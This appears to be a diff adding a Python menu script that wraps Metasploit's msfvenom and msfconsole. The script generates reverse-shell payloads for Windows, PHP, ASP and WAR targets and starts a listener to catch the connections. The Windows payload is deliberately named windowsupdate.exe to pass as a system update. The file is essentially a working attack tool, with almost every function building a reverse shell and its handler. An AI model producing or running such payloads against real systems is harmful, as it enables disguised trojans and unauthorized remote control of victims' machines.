@@ -1,0 +1,113 @@
+#!/usr/bin/python3
+# Author: dagg0rath
+# https://github.com/dagg0rath
+
+## Imports ##
+import os, time
+from colorama import Fore,Style
+
+def main():
+
+	def windows():
+		print(Fore.RED + "[+] WINDOWS")
+
+		ip = input("[?] Specify your IP or interface you wish to use: "+ Style.RESET_ALL)
+		port = input(Fore.RED + "[?] Specify the PORT where you want to listen for connections: " + Style.RESET_ALL)
+		
+		print(Fore.YELLOW + "[=] Creating Payload..." + Style.RESET_ALL)
+		os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -a x86 --platform windows-f exe -o ./windowsupdate.exe')
+		
+		print(Fore.YELLOW + "[=] Setting up a listener..." + Style.RESET_ALL)
+		os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit;"')
+
+	def php():
+		print(Fore.RED + "[+] PHP")
+
+		ip = input("[?] Specify your IP or interface you wish to use: "+ Style.RESET_ALL)
+		port = input(Fore.RED + "[?] Specify the PORT where you want to listen for connections: " + Style.RESET_ALL)
+		
+		print(Fore.YELLOW + "[=] Creating Payload..." + Style.RESET_ALL)
+		os.system(f'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php')
+		
+		print(Fore.YELLOW + "[=] Setting up a listener..." + Style.RESET_ALL)
+		os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set lhost {ip}; set lport {port}; exploit;"')
+
+	def asp():
+		print(Fore.RED + "[+] ASP")
+
+		ip = input("[?] Specify your IP or interface you wish to use: "+ Style.RESET_ALL)
+		port = input(Fore.RED + "[?] Specify the PORT where you want to listen for connections: " + Style.RESET_ALL)
+		
+		print(Fore.YELLOW + "[=] Creating Payload..." + Style.RESET_ALL)
+		os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp')
+		
+		print(Fore.YELLOW + "[=] Setting up a listener..." + Style.RESET_ALL)
+		os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit;"')
+
+	def war():
+		print(Fore.RED + "[+] WAR")
+
+		ip = input("[?] Specify your IP or interface you wish to use: "+ Style.RESET_ALL)
+		port = input(Fore.RED + "[?] Specify the PORT where you want to listen for connections: " + Style.RESET_ALL)
+		
+		print(Fore.YELLOW + "[=] Creating Payload..." + Style.RESET_ALL)
+		os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war')
+		
+		print(Fore.YELLOW + "[=] Setting up a listener..." + Style.RESET_ALL)
+		os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload java/jsp_shell_reverse_tcp; set lhost {ip}; set lport {port}; exploit;"')
+
+	def logo():
+		print(Fore.RED + """
+  ______ __  __ ______                                        
+ /_  __// / / // ____/                                        
+  / /  / /_/ // __/                                           
+ / /  / __  // /___                                           
+/_/  /_/ /_//_____/                                           
+  ______ ____   __  __ ______ __  __ __     ______ _____ _____
+ /_  __// __ \ / / / //_  __// / / // /    / ____// ___// ___/
+  / /  / /_/ // / / /  / /  / /_/ // /    / __/   \__ \ \__ \ 
+ / /  / _, _// /_/ /  / /  / __  // /___ / /___  ___/ /___/ / 
+/_/  /_/ |_| \____/  /_/  /_/ /_//_____//_____/ /____//____/ """ + Style.RESET_ALL)
+
+	def main_menu():
+		try:
+			choice = int(input("""
+[?]--Welcome! Choose one of the options below:
+----------------------------------------------
+[01]--Windows
+[02]--PHP
+[03]--ASP
+[04]--WAR
+""" + Fore.RED + """[00]--Quit
+""" + Style.RESET_ALL))
+			if choice == 1:
+				windows()
+			elif choice == 2:
+				php()
+			elif choice == 3:
+				asp()
+			elif choice == 4:
+				war()
+			else:
+				print("[-] Goodbye...")
+		except KeyboardInterrupt:
+			print("[-] Program interrumpted by user, quitting...")
+		except ValueError:
+			print("[-] Wrong value given, quitting...")
+
+	
+
+
+	## EXECUTION ##
+	os.system('clear')
+	os.system('service postgresql start')
+	logo()
+	main_menu()
+## ROOT CHECK ##
+def is_root():
+    return os.geteuid() == 0
+sudo = is_root()
+if sudo == True:
+	main()
+else:
+	print(Fore.RED + "\n[-] Please, run this toolkit as root" + Fore.WHITE)
